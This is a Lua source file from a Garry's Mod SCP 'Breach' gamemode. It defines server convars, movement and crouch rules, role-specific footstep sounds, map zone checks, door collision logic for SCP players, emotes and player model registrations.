if !ConVarExists("br_scale_bullet_damage") then CreateConVar("br_scale_bullet_damage", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Bullet damage scale" ) end
if !ConVarExists("br_new_eq") then CreateConVar("br_new_eq", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE, FCVAR_REPLICATED}, "Enables new EQ" ) end
if !ConVarExists("br_enable_warhead") then CreateConVar("br_enable_warhead", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE }, "Enables OMEGA Warhead" ) end
if !ConVarExists("br_scale_human_damage") then CreateConVar("br_scale_human_damage", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE }, "Scales damage dealt by humans" ) end
if !ConVarExists("br_scale_scp_damage") then CreateConVar("br_scale_scp_damage", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE }, "Scales damage dealt by SCP" ) end
if !ConVarExists("br_scp_penalty") then CreateConVar("br_scp_penalty", "3", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE }, "" ) end
if !ConVarExists("br_premium_penalty") then CreateConVar("br_premium_penalty", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE }, "" ) end

local random, GetKeys = math.random, table.GetKeys

function table.Random(tab, issequential)
    local keys = issequential and tab or GetKeys(tab)
    local rand = keys[random(1, #keys)]
    return tab[rand], rand 
end

function BREACH.GroundPos( pos )
	local trace = { }
	trace.start = pos;
	trace.endpos = trace.start - vec_up
	trace.mask = MASK_BLOCKLOS

	local tr = util.TraceLine( trace )

	if ( tr.Hit ) then
		return tr.HitPos
	end

	return pos

end

local AllowedModels = {



	["models/cultist/humans/mog/mog.mdl"] = true,

	["models/cultist/humans/chaos/chaos.mdl"] = true,

	["models/cultist/humans/osn/osn.mdl"] = true,

	["models/cultist/humans/ntf/ntf.mdl"] = true,

	["models/cultist/humans/goc/goc.mdl"] = true,

	["models/cultist/humans/fbi/fbi.mdl"] = true,

	["models/cultist/humans/mog/mog_hazmat.mdl"] = true,

	["models/cultist/humans/mog/mog_jagger.mdl"] = true,

	["models/cultist/humans/russian/russians.mdl"] = true,

	["models/cultist/humans/mog/sexy_mog_hazmat.mdl"] = true,


	["models/cultist/humans/mog/mog_woman_capt.mdl"] = true,
	["models/cultist/humans/mog/mog_woman.mdl"] = true,
	["models/cultist/humans/goc/goc_female_commander.mdl"] = true,
	["models/cultist/humans/fbi/fbi_woman.mdl"] = true,
	["models/cultist/humans/ntf/ntf_female_sniper.mdl"] = true,



}

local canjumpscp = {
	--["SCP076"] = true,
}
local cancrouchscp = {
}

BREACH.EMOTES = {
	{
		name = "Согласиться",
		premium = false,
		gesture = "0_shaky_handgesture_agree"
	},
	{
		name = "Не согласиться",
		premium = false,
		gesture = "0_shaky_handgesture_disagree"
	},
	{
		name = "Неодобрять",
		premium = false,
		gesture = "0_shaky_handgesture_disapprove"
	},
	{
		name = "Отдать честь",
		premium = false,
		gesture = "0_shaky_handgesture_salute"
	},
	{
		name = "Помахать",
		premium = false,
		gesture = "0_shaky_handgesture_wave"
	},
	{
		name = "Показать вперед",
		premium = false,
		gesture = "0_shaky_handgesture_point"
	},
}

hook.Add("SetupMove", "OverrideMovement", function(ply, mv, cmd)
local movetype = ply:GetMoveType()
if movetype == MOVETYPE_NOCLIP or movetype == MOVETYPE_OBSERVER then
	return
end

local pl = ply:GetTable()
local rolename = pl:GetRoleName()
local ducking = mv:KeyDown(IN_DUCK)
local jumping = mv:KeyDown(IN_JUMP)
local buttons = mv:GetButtons()

if ply:Crouching() and jumping then
	mv:SetButtons(buttons - IN_JUMP)
end

--[[
if GetGlobalString("RoundName") == "CTF" then
	local shawm = false
	for k, v in ipairs(ply:GetChildren()) do
		if v:GetClass() == "item_ctf_doc" then
			shawm = true
		end
	end

	if mv:KeyDown(IN_SPEED) and shawm and ply:GTeam() != TEAM_SPEC then
		mv:SetMaxClientSpeed(100)
	end
end
--]]

--[[
if SERVER then
	ply:SetBreachCrouch(pl.Ducking == true)
else
	pl.Ducking = ply:GetBreachCrouch()
end
--]]

	--[[
	if mv:GetVelocity():Length2DSqr() > 100 and mv:KeyDown(IN_JUMP) and ply:IsOnGround() then
		mv:SetButtons(mvbuttons - IN_JUMP)
	end
	--]]

	if ply:GTeam() != TEAM_SCP then

		--[[
		local actwep = ply:GetActiveWeapon()
		local actwepvalid = IsValid(actwep)
		local actwep_class = actwepvalid and actwep:GetClass()

		if actwepvalid then
			if actwep_class == "item_shield" then
				mv:RemoveKey(IN_DUCK)
			end
		end
		--]]

		--[[
		if (ply:KeyPressed(IN_DUCK) and IsFirstTimePredicted()) and (!actwepvalid or actwep_class != "item_shield") then
			pl.Ducking = !pl.Ducking
			if AllowedModels[ply:GetModel()] then
				if pl.Ducking then
					ply:EmitSound( "^nextoren/charactersounds/foley/posechange_" .. math.random( 1, 6 ) .. ".wav", 60, math.random( 100, 105 ), 1, CHAN_STATIC )
				else
					ply:EmitSound( "^nextoren/charactersounds/foley/posechange_" .. math.random( 1, 6 ) .. ".wav", 60, math.random( 90, 95 ), 1, CHAN_STATIC )
				end
			end
		end

		if ducking then
			mv:SetButtons(mv:GetButtons() - IN_DUCK)
		end
		--]]

		if ducking then
			ply:SetDuckSpeed(0.1)
			ply:SetUnDuckSpeed(0.1)
			if jumping then
				mv:SetButtons(buttons - IN_JUMP)
			end
		end

	else

		if jumping and !canjumpscp[rolename] then
			mv:SetButtons(buttons - IN_JUMP)
		end

		if ducking and !cancrouchscp[rolename] then
			mv:SetButtons(buttons - IN_DUCK)
		end

	end

end)

BREACH = BREACH || {}

local mply = FindMetaTable("Player")

function mply:StopForcedAnimation()
    if CLIENT then return end
    timer.Remove("SeqF"..self:EntIndex())
    timer.Remove("MoveCheckSeq"..self:EntIndex())
    if isfunction(self.StopFAnimCallback) then self.StopFAnimCallback() self.StopFAnimCallback = nil end
    
    self.ForceAnimSequence = nil        
    net.Start("SHAKY_EndForcedAnimSync")
    net.WriteEntity(self)
    net.Broadcast()
end

if CLIENT then
    net.Receive("SHAKY_EndForcedAnimSync", function(len)
        local ply = net.ReadEntity()
        if IsValid(ply) then
            ply.ForceAnimSequence = nil
        end
    end)
    
    net.Receive("SHAKY_SetForcedAnimSync", function(len)
        local ply = net.ReadEntity()
		if !IsValid(ply) then return end
        local sequence = net.ReadString()
        ply:SetCycle(0)
        ply.ForceAnimSequence = ply:LookupSequence(sequence)
    end)
end

function BREACH.GroundPos( pos )

	local trace = { }
	trace.start = pos;
	trace.endpos = trace.start - vec_up
	trace.mask = MASK_BLOCKLOS

	local tr = util.TraceLine( trace )

	if ( tr.Hit ) then

		return tr.HitPos

	end

	return pos

end

MINPLAYERS = GetConVar("br_min_players"):GetInt()

function GetPrepTime()
	return BREACH.RoundPrepareTime or 62
end

function GetRoundTime()
	if GetGlobalBool("BigRound", false) then
		return 1170--1020
	end
	return 720--GetConVar("br_time_round"):GetInt()
end

function GetPostTime()
	return 30
end

function GetGateOpenTime()
	return GetConVar("br_time_gateopen"):GetInt()
end

function GetNTFEnterTime()
	return GetConVar("br_time_ntfenter"):GetInt()
end

function InGas(ply)
	if GAS_AREAS == nil then return false end
	for k,v in pairs(GAS_AREAS) do
		local pos1 = v.pos1
		local pos2 = v.pos2
		OrderVectors(pos1, pos2)
		if ply:GetPos():WithinAABox( pos1, pos2 ) then
			return true
		end
	end
	return false
end

function GM:EntityFireBullets( ent, data )
end

local mply = FindMetaTable( "Player" )

function mply:ToPD()
	local client = LocalPlayer()
	client:SetPos( Vector(3674.955811, -14796.375000, -2991.968750) )
end

local AllowedModels = {

	["models/cultist/humans/mog/mog.mdl"] = true,
	["models/cultist/humans/chaos/chaos.mdl"] = true,
	["models/cultist/humans/osn/osn.mdl"] = true,
	["models/cultist/humans/chaos/fat/chaos_fat.mdl"] = true,
	["models/cultist/humans/ntf/ntf.mdl"] = true,
	["models/cultist/humans/goc/goc.mdl"] = true,
	["models/cultist/humans/fbi/fbi.mdl"] = true,
    ["models/cultist/humans/nazi/nazi.mdl"] = true,
    ["models/cultist/humans/russian/russians.mdl"] = true,
	["models/cultist/humans/mog/mog_hazmat.mdl"] = true,
	["models/cultist/humans/obr/obr.mdl" ] = true,
	["models/cultist/humans/obr/obr_new.mdl" ] = true,
	["models/cultist/humans/mog/mog_jagger.mdl"] = true,
	["models/cultist/humans/mog/mog_woman_capt.mdl"] = true,
	["models/cultist/humans/mog/mog_woman.mdl"] = true,
	["models/cultist/humans/goc/goc_female_commander.mdl"] = true,
	["models/cultist/humans/fbi/fbi_woman.mdl"] = true,
	["models/cultist/humans/ntf/ntf_female_sniper.mdl"] = true,
	["models/cultist/scp/scp_912.mdl"] = true,
	["models/cultist/humans/mog/sexy_mog_hazmat.mdl"] = true,

}

local silencedwalkroles = {
	[role.UIU_Clocker] = true,
	[role.SCI_NegoGOC] = true,
	
	["SCP457"] = true,
	["SCP096"] = true,
	["SCP062DE"] = true,
	["SCP062FR"] = true,
	["SCP1903"] = true,
	["SCP999"] = true,
	--["SCP076"] = true,
	["SCP106"] = true,
}

SCPFOOTSTEP = {
	["SCP682"] = true,
	["SCP939"] = true,
	["SCP082"] = true,
}

FOOTSTEP_SOUNDTIME = {
	["SCP638"] = 500,
}

function GM:PlayerFootstep( ply, pos, foot, sound, volume, rf )
--[[
--Clientside footsteps to optimize server
	if SERVER then
		return true
	end
--]]

local pl = ply:GetTable()

	local vel = ply:GetVelocity():Length2DSqr()
	local wep = ply:GetActiveWeapon()
	if not pl.GetRoleName then
		player_manager.RunClass( ply, "SetupDataTables" )
	end
	if not pl.GetRoleName then return end

	if ply:GetNoDraw() then return true end

	if silencedwalkroles[ply:GetRoleName()] then
		if ply:GetRoleName() == "SCP062DE" then
			if SERVER then
				ply:EmitSound( "^nextoren/charactersounds/foley/sprint/sprint_"..math.random( 1, 52 )..".wav", 75, 85, volume * .5)
			end
			return false
		end
		return true
	end

	if ply:GetModel():find("goc") then
		if SERVER then
			ply:EmitSound( "^nextoren/charactersounds/foley_goc/gear"..math.random( 1, 6 )..".wav", 75, math.random( 90, 110 ), volume * .8)
		end
		return true
	end

	if ply:GetRoleName() == "SCP973" then
		if SERVER then
			ply:EmitSound( "^nextoren/charactersounds/foley_scp/cop_step_"..math.random( 1, 6 )..".wav", 75, math.random( 90, 110 ), volume * 1.1)
		end
		return true
	end

	if ply:GetRoleName() == "SCP542" then
		if SERVER then
			ply:EmitSound( "^nextoren/charactersounds/foley_scp/ger_walk_"..math.random( 1, 6 )..".wav", 75, math.random( 90, 110 ), volume * 1.1)
		end
		return true
	end
	if ply:GetRoleName() == "SCP8602" then
		if SERVER and !ply.SilenceSCP860 then 
			ply:EmitSound( "^nextoren/scp/682/scp_682_footstep_"..math.random(1,4)..".ogg", 75, math.random(200,225), volume * .8 )
			if !ply.funy_view then ply.funy_view = 1 end
			if ply.funy_view == -1 then
				ply.funy_view = 1
			else
				ply.funy_view = -1
			end
			if ply:GetRunSpeed() == 300 then
				ply:ViewPunch(Angle(3,0,0))
			else
				ply:ViewPunch(Angle(2,0,ply.funy_view))
			end
		end
		return true
		--EmitSound(string soundName, number soundLevel = 75, number pitchPercent = 100, number volume = 1, number channel = CHAN_AUTO, CHAN_WEAPON for weapons, number soundFlags = 0, number dsp = 0)
	end

	if ply:GetRoleName() == "SCP173" then
		if pl.steps == nil then pl.steps = 0 end
		pl.steps = pl.steps + 1
		if pl.steps > 6 then
			pl.steps = 1
			if SERVER then
				ply:EmitSound( "^173sound"..math.random(1,3)..".ogg", 75, math.random( 100, 120 ), volume * .8 )
			end
		end
		return true
	elseif ply:GetRoleName() == "SCP2012" then

		if SERVER then ply:EmitSound( "^nextoren/scp/2012/footsteps/footstep_"..math.random(1,8)..".wav", 75, math.random( 100, 120 ), volume * .8 ) end
		return true

	elseif ( SCPFOOTSTEP[ply:GetRoleName()] ) then

		if SERVER then ply:EmitSound( "^nextoren/scp/682/scp_682_footstep_"..math.random(1,4)..".ogg", 75, math.random( 100, 120 ), volume * .8 ) end
		return true

	elseif ( AllowedModels[ ply:GetModel() ] ) then

		if ( vel > 22500 ) then

			ply:EmitSound( "^nextoren/charactersounds/foley/sprint/sprint_"..math.random( 1, 52 )..".wav", 75, math.random( 100, 120 ), volume * .3 )

		else

			ply:EmitSound( "^nextoren/charactersounds/foley/run/run_"..math.random( 1, 40 )..".wav", 75, math.random( 100, 120 ), volume * .3)

		end

		return false

	elseif ply:GetRoleName() == "SCP049" then

		if SERVER then

			ply:EmitSound( "^nextoren/scp/049/step"..math.random(1,3)..".ogg", 75, math.random( 100, 120 ), volume * .8 )

		end

		return true

	elseif ply:GetRoleName() == "SCP638" then

		if SERVER then

			ply:EmitSound( "^nextoren/charactersounds/zombie/foot"..math.random(1,3)..".wav", 75, math.random( 100, 120 ), volume * .8 )
		
		end

		return true

	elseif ply:GetRoleName() == "SCP076" or ply:GetRoleName() == "SCP811" then

		if SERVER then

			ply:EmitSound( "^nextoren/charactersounds/zombie/foot"..math.random(2,3)..".wav", 75, math.random( 85, 95 ), volume * .35 )
		
		end

		return true

	end
	return false
end

local meta = FindMetaTable("Player");
local ent = FindMetaTable( "Entity" )

function ent:IsLZ()

	local pos = self:GetPos()
  
	if ( pos.x > 4600 && pos.y > -7003 && pos.y < -1200 && pos.z < 880 || pos.x > 8550 && pos.y < -440 && pos.y > -7000 || ( pos.x > -1000 && pos.x < 1680 ) && pos.y < -3600 && pos.y > -6000 && pos.z > -1300 ) then
  
	  return true
  
	end
  
	if ( pos.x > 7283 && pos.x < 7680 && pos.y < -1075 && pos.y > -1240 ) then
  
	  return true
  
	end
  
	return false
  
end
  
function ent:Outside()



	if ( self:GetPos().z > 880 ) then
  
  
  
	  return true;
  
  
  
	end
  
  
  
	return false
  
  
  
end
  
function ent:Outside()



	if ( self:GetPos().z > 880 ) then
  
  
  
	  return true;
  
  
  
	end
  
  
  
	return false
  
  
  
end
  
  
  
function ent:IsEntrance()
  
	local pos = self:GetPos()
  
	if ( pos.x < 1767 && pos.x > -3120 && pos.y > 1944 && pos.y < 6600 && pos.z < 880 ) then
  
	  return true
  
	end
  
	return false
  
end



function meta:IsBlack()
	for i, v in pairs(ents.FindByClassAndParent("ent_bonemerged", self)) do
		if IsValid(v) and (v:GetModel():find("balaclava") or v:GetModel():find("head_main_1") ) then
			if NextOren_HEADS_BLACKHEADS[v:GetSubMaterial(0)] then
				return true
			elseif NextOren_HEADS_BLACKHEADS[v:GetSubMaterial(2)] then
				return true
			end
		end
	end
	return false
end
  
  
  
  
  
function ent:IsHardZone()
  
	local pos = self:GetPos()
  
	if ( pos.x < 8320 && pos.x > 1200 && pos.y > -1200 && pos.z < 880 ) then
  
	  return true
  
	end
  
	return false
  
end

local blockeddoors_scp = {
	Vector(-105.000000, 6153.000000, 786.000000),
	Vector(-2588.120117, 7636.629883, 787.229980),
	Vector(-4742.490234, 4279.509766, 530.250000),
	Vector(-4560.000000, 4486.000000, 530.000000),
	Vector(-942.479980, 1279.979980, -136.199997),
	Vector(-1149.750000, 8030.000000, 1710.781250),
	Vector(-1008.869995, 1240.859985, -137.000000),
	Vector(-1149.760010, 8030.009766, 1710.800049),
	Vector(-1167.760010, 7946.009766, 1710.000000),
	Vector(-1167.750000, 7946.000000, 1710.000000),
	Vector(-942.479980, 1279.979980, -136.199997),
	Vector(-744.000000, 1404.010010, -138.000000),
	Vector(-5028.9702148438, 3993.5, -1947),
}

local banned_models = {

	[ "*506" ] = true,
	[ "*507" ] = true,
	[ "*474" ] = true,
	[ "*473" ] = true,
	[ "*290" ] = true,
	[ "*291" ] = true,
	[ "*344" ] = true,
	[ "models/cult_props/gates/bunker_gates/bunker_door_right.mdl" ] = true,
	[ "models/cult_props/gates/bunker_gates/bunker_door_left.mdl" ] = true,

}

function hook.Exists(var, var2)
	local tab = hook.GetTable()
	if tab[var] and tab[var2] then return true end
	return false
end


function GM:ShouldCollide( ent1, ent2 )

	--local _, bool = pcall(function()

		--[[

		if IsValid(ent1) and ent1.GetModel and !banned_models[ent1:GetModel()] and ent1.OpenedBySCP096 then
			return false
		end

		if IsValid(ent1) and ent1.GetParent and IsValid(ent1:GetParent()) and ent1:GetParent().OpenedBySCP096 then
			return false
		end

		--]]

		local ent1_class = ent1:GetClass()
		local ent2_class = ent2:GetClass()

		if ent1:IsPlayer() and ent1:GTeam() == TEAM_SCP or ent2:IsPlayer() and ent2:GTeam() == TEAM_SCP then
			if ( ent1_class == "func_door"
				or ent2_class == "func_door"
				or ent2_class == "prop_dynamic"
				or ent1_class == "prop_dynamic" )
				and !banned_models[ent1:GetModel()]
				and !banned_models[ent2:GetModel()] then
				
				if (ent1:IsPlayer() and ent1:GetRoleName() == SCP106 or ent2:IsPlayer() and ent2:GetRoleName() == SCP106) then
					if SERVER then
						return SCPLockDownHasStarted != true
					else
						return false
					end
				end
				if (ent1:IsPlayer() and ent1:GetRoleName() == SCP096 and ent1:GetWalkSpeed() != 40 ) or (ent2:IsPlayer() and ent2:GetRoleName() == SCP096 and ent2:GetWalkSpeed() != 40) then
					if SERVER and (ent1:CreatedByMap() or ent2:CreatedByMap()) then
						return false
					end
				end
			end
		end

	--end)

	--if isbool(bool) then
		--return bool
	--end

	return true

end

/*
function GM:PlayerShouldTakeDamage( ply, attacker ) 
	
end
*/

function GM:Move( ply, mv )
end

function ent:AddNetworkVar( name, type )
	if !self._NVTable then
		self._NVTable = {
			Int = { 0, 32 },
			Float = { 0, 32 },
			Bool = { 0, 32 },
			String = { 0, 4 },
			Vector = { 0, 32 },
			Angle = { 0, 32 },
			Entity = { 0, 32 }
		}
	end

	local tab = self._NVTable[type]
	assert( tab, "Unknown NetworkVar type: "..tostring( type ) )
	assert( tab[1] < tab[2], "You have already hit NetworkVar limit for type '"..tostring( type ).."' on this entity! ["..tostring( self ).."]" )

	self:NetworkVar( type, tab[1], name )
	tab[1] = tab[1] + 1
end

player_manager.AddValidModel("12312399", "models/cultist/humans/chaos/fat/chaos_fat.mdl")
player_manager.AddValidHands("12312399", "models/cultist/humans/chaos/hands/c_arms_chaos.mdl", 0, "000000")

player_manager.AddValidModel("777771", "models/shaky/scp/scp2012/scp_2012.mdl")
player_manager.AddValidHands("777771", "models/cultist/scp/scp2012/scp_2012_arms.mdl", 0, "000000")

player_manager.AddValidModel("777772", "models/cultist/scp/scp_076.mdl")
player_manager.AddValidHands("777772", "models/cultist/scp/scp_076_arms.mdl", 0, "000000")

player_manager.AddValidModel("125312399", "models/cultist/humans/osn/osn.mdl")
player_manager.AddValidHands("125312399", "models/cultist/humans/osn/hands/c_arms_osn.mdl", 0, "000000")

player_manager.AddValidModel("125312398", "models/cultist/humans/specialmod/nazi/nazi.mdl")
player_manager.AddValidHands("125312398", "models/cultist/humans/specialmod/nazi/arms/c_arms_nazi.mdl", 0, "000000")

player_manager.AddValidModel("125312397", "models/cultist/humans/specialmod/american/american.mdl")
player_manager.AddValidHands("125312397", "models/cultist/humans/specialmod/american/arms/c_arms_american.mdl", 0, "000000")

player_manager.AddValidModel("125312396", "models/cultist/humans/sci/class_d_fat.mdl")
player_manager.AddValidHands("125312396", "models/cultist/humans/sci/hands/c_arms_sci.mdl", 0, "000000")

player_manager.AddValidModel("125312395", "models/cultist/humans/sci/class_d_bor.mdl")
player_manager.AddValidHands("125312395", "models/cultist/humans/sci/hands/c_arms_sci.mdl", 0, "000000")

player_manager.AddValidModel("21525", "models/cultist/humans/mog/mog_woman_capt.mdl")
player_manager.AddValidHands("21525", "models/cultist/humans/mog/hands/c_arms_mog.mdl", 0, "000000")

player_manager.AddValidModel("6216", "models/cultist/humans/mog/mog_woman.mdl")
player_manager.AddValidHands("6216", "models/cultist/humans/mog/hands/c_arms_mog.mdl", 0, "000000")

player_manager.AddValidModel("62161", "models/cultist/humans/goc/goc_female_commander.mdl")
player_manager.AddValidHands("62161", "models/cultist/humans/goc/hands/c_arms_goc.mdl", 0, "000000")

player_manager.AddValidModel("62162", "models/cultist/humans/fbi/fbi_woman.mdl")
player_manager.AddValidHands("62162", "models/cultist/humans/fbi/hands/c_arms_fbi.mdl", 0, "000000")

player_manager.AddValidModel("62167", "models/cultist/humans/ntf/ntf_female_sniper.mdl")
player_manager.AddValidHands("62167", "models/cultist/humans/ntf/hands/c_arms_ntf.mdl", 0, "000000")

player_manager.AddValidModel("62163", "models/cultist/humans/mog/special_security_woman.mdl")
player_manager.AddValidHands("62163", "models/cultist/humans/mog/hands/c_arms_admin.mdl", 0, "000000")

player_manager.AddValidModel("62164", "models/cultist/humans/security/security_female.mdl")
player_manager.AddValidHands("62164", "models/cultist/humans/security/hands/c_arms_security.mdl", 0, "000000")

player_manager.AddValidModel("62165", "models/cultist/humans/class_d/shaky/class_d_fat_new.mdl")
player_manager.AddValidHands("62165", "models/cultist/humans/class_d/hands/c_arms_class_d.mdl", 0, "000000")

player_manager.AddValidModel("62166", "models/cultist/humans/class_d/shaky/class_d_bor_new.mdl")
player_manager.AddValidHands("62166", "models/cultist/humans/class_d/hands/c_arms_class_d.mdl", 0, "000000")

player_manager.AddValidModel("62167", "models/cultist/humans/obr/obr_new.mdl")
player_manager.AddValidHands("62167", "models/cultist/humans/obr/hands/c_arms_obr_new.mdl", 0, "000000")

player_manager.AddValidModel("62168", "models/cultist/humans/mog/sexy_mog_hazmat.mdl")
player_manager.AddValidHands("62168", "models/cultist/humans/mog/hands/c_arms_hazmat.mdl", 0, "000000")

player_manager.AddValidModel("3spac_thebestprogrammer", "models/cultist/humans/fbi/fbi_agent.mdl")
player_manager.AddValidHands("3spac_thebestprogrammer", "models/cultist/humans/fbi/hands/c_arms_fbi_agent.mdl", 0, "000000")

player_manager.AddValidModel("e", "models/player/april/the_goose.mdl")
player_manager.AddValidHands("e", "models/cultist/humans/mog/hands/c_arms_hazmat.mdl", 0, "000000")

--[[player_manager.AddValidModel("goc_b", "models/player/cheddar/suit/orange_suit/orangesuit.mdl")
player_manager.AddValidHands("goc_b", "models/goc_hands/c_arms_goc.mdl", 0, "000000")

player_manager.AddValidModel("goc_a", "models/player/cheddar/goc/strike_team_soldier2/goc_striker_team.mdl")
player_manager.AddValidHands("goc_a", "models/goc_hands/c_arms_goc.mdl", 0, "000000")

player_manager.AddValidModel("goc_d", "models/player/cheddar/goc_soldier/goc_officer.mdl")
player_manager.AddValidHands("goc_d", "models/goc_hands/c_arms_goc.mdl", 0, "000000")]]